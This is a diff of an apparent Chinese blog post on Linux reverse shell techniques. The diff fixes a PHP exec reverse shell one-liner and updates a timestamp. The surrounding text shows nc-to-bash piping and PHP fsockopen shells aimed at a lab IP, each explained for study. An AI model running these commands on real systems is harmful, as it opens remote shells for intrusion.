@@ -119,7 +119,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/JbLmF1b3l9.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/1H1Ie6D8Hg.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/B0c9GjFmD5.png?imageslim">
-<meta property="og:updated_time" content="2018-07-18T07:31:30.632Z">
+<meta property="og:updated_time" content="2018-09-05T01:51:33.851Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux下几种反弹shell方法的总结与理解">
 <meta name="twitter:description" content="Linux下几种反弹shell方法的总结与理解之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法">
@@ -441,7 +441,7 @@ nc -help成功
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/8ab45ddDa8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/iliCEIg5cL.png?imageslim" alt="mark"><br><strong>这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的<code>/bin/bash</code>，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/bCG25adDFg.png?imageslim" alt="mark"></p>
 <h3 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h3><p><strong>使用php反弹shell，方法如下</strong><br><strong>首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php- <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'</span></div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'</span></div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/AfJ3e8GI2i.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/Da1d5I1GgL.png?imageslim" alt="mark"><br><strong>还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/fmLfgB7mg1.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/JbLmF1b3l9.png?imageslim" alt="mark"><br><strong>这个姿势看起来有一些难以理解，尤其是还出现了<code>&lt;&amp;</code>这个符号，当然如果把&amp;看着是取地址符或者是引用，那还是可以理解的，为了更方便的理解，我在这将这条命令稍微修改了一下，类似于前面的第二种方法</strong></p>
